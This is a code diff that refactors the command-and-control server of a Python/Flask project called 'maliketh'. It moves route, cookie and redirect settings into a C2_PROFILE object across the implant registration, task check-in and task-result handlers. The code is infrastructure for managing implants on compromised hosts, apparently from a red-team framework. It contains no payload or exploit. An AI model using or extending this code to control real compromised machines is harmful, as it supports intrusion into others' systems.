@@ -6,10 +6,7 @@ import maliketh.crypto.aes
 from maliketh.models import *
 from functools import wraps
 from maliketh.config import (
-    get_c2_route,
-    get_c2_route_methods,
-    get_c2_server_option,
-    C2_BASE_PATH,
+    C2_PROFILE
 )
 from maliketh.crypto.ec import (
     generate_ecc_keypair,
@@ -23,7 +20,7 @@ from nacl.encoding import Base64Encoder
 import base64
 
 logger = StandardLogger(sys.stdout, sys.stderr, LogLevel.INFO)
-c2 = Blueprint("c2", __name__, url_prefix=C2_BASE_PATH)
+c2 = Blueprint("c2", __name__, url_prefix=C2_PROFILE.routes.base_path)
 
 
 def implant_authenticated(func: Callable):
@@ -34,10 +31,10 @@ def implant_authenticated(func: Callable):
 
     @wraps(func)
     def wrapper(*args, **kwargs):
-        if request.endpoint == get_c2_route("register"):
+        if request.endpoint == C2_PROFILE.routes.register.path:
             return
 
-        imp_id = request.cookies.get(get_c2_server_option("implant_id_cookie"))
+        imp_id = request.cookies.get(C2_PROFILE.globals.implant_id_cookie)
         if imp_id is None:
             return "Unauthorized", 401
 
@@ -65,10 +62,10 @@ def implant_authenticated(func: Callable):
 
 @c2.route("/")
 def hello_c2():
-    return redirect(get_c2_server_option("redirect_url"))
+    return redirect(C2_PROFILE.server_profile.redirect_url)
 
 
-@c2.route(get_c2_route("register"), methods=get_c2_route_methods("register"))
+@c2.route(C2_PROFILE.routes.register.path, methods=C2_PROFILE.routes.register.methods)
 def register():
     # /register
     # Read implant public key from body
@@ -118,11 +115,7 @@ def register():
     db.session.commit()
 
     # Create default config
-    config = ImplantConfig.create_min_config(
-        implant_id=implant.implant_id,
-        cookie=get_c2_server_option("implant_id_cookie"),
-        b64_server_pub=pk_b64,
-    )
+    config = ImplantConfig.from_profile(C2_PROFILE, implant.implant_id, pk_b64)
 
     resp_body = json.dumps(
         {
@@ -143,16 +136,16 @@ def register():
     resp.status_code = 200
 
     # Set cookie to implant ID
-    resp.set_cookie(get_c2_server_option("implant_id_cookie"), implant.implant_id)
+    resp.set_cookie(C2_PROFILE.globals.implant_id_cookie, implant.implant_id)
 
     return resp
 
 
-@c2.route(get_c2_route("checkin"), methods=get_c2_route_methods("checkin"))  # type: ignore
+@c2.route(C2_PROFILE.routes.checkin.path, methods=C2_PROFILE.routes.checkin.methods)  # type: ignore
 @implant_authenticated
 def get_task():
     # Get implant id from cookie
-    implant_id = request.cookies.get(get_c2_server_option("implant_id_cookie"))
+    implant_id = request.cookies.get(C2_PROFILE.globals.implant_id_cookie)
 
     if implant_id is None:
         return "Not Found", 404
@@ -175,7 +168,7 @@ def get_task():
     return jsonify({})
 
 
-@c2.route(get_c2_route("task_results"), methods=get_c2_route_methods("task_results"))  # type: ignore
+@c2.route(C2_PROFILE.routes.task_results.path, methods=C2_PROFILE.routes.task_results.methods)  # type: ignore
 @implant_authenticated
 def post_task(decrypted_body: Optional[Dict[str, Union[str, bool]]] = None):
     """
@@ -188,7 +181,7 @@ def post_task(decrypted_body: Optional[Dict[str, Union[str, bool]]] = None):
         return "Unauthorized", 401
 
     # Get implant id from cookie
-    implant_id = request.cookies.get(get_c2_server_option("implant_id_cookie"))
+    implant_id = request.cookies.get(C2_PROFILE.globals.implant_id_cookie)
 
     if implant_id is None:
         return "Unauthorized", 404
